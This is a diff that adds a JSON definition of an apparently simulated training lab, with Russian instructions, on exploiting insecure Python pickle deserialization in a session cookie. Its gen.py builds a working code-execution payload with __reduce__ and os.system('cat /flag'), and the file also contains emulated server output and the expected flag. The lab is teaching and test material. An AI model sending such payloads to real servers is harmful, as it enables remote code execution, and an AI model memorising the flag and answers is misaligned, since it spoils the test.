@@ -1,0 +1,51 @@
+{
+  "id": "web-deserialization",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{p1ckl3_r3duc3_1s_c0d3_3x3cut10n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: небезопасная десериализация (pickle) на dashboard.example\n\nСервер отдаёт cookie `session` — длинный base64. Похоже на сериализованный объект.\n\n1. Определи формат: `base64 -d cookie.txt | xxd | head -2` → `80 04` = Python pickle.\n2. В `gen.py` лежит класс с `__reduce__`, возвращающий `(os.system, ('cat /flag',))`.\n   Сгенерируй payload: `python3 gen.py` — он выведет base64-blob.\n3. Скопируй blob и отправь его серверу в cookie:\n   `curl -s http://dashboard.example/ -b 'session=<blob>'`\n4. Сервер вызовет `pickle.loads` → выполнит команду. В ответе — флаг.\n5. `... | grep 'nto' > found.txt`, затем `check`.\n"
+    },
+    {
+      "path": "/home/student/task/cookie.txt",
+      "text": "gASVJQAAAAAAAAB9lCiMBHVzZXKUjANib2KUjARjYXJ0lF2UjAZsYXB0b3CUYXUu\n"
+    },
+    {
+      "path": "/home/student/task/gen.py",
+      "text": "import pickle, os, base64\n\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('cat /flag',))\n\nprint(base64.b64encode(pickle.dumps(Exploit(), protocol=4)).decode())\n"
+    }
+  ],
+  "tools": {
+    "python3": {
+      "help": "python3 <скрипт> — интерпретатор Python",
+      "cases": [
+        {
+          "match": "gen\\.py",
+          "example": "gen.py",
+          "output": "gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAljYXQgL2ZsYWeUhZRSlC4=\n"
+        }
+      ],
+      "fallback": "python3: в этой лабе доступен только `python3 gen.py`.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция dashboard.example)",
+      "cases": [
+        {
+          "match": "session=gASV",
+          "example": "-s http://dashboard.example/ -b 'session=<blob>'",
+          "output": "uid=0(root) gid=0(root) groups=0(root)\nnto{p1ckl3_r3duc3_1s_c0d3_3x3cut10n}\n"
+        }
+      ],
+      "fallback": "curl: отправь cookie `session` с pickle-blob на http://dashboard.example/.\n"
+    }
+  }
+}
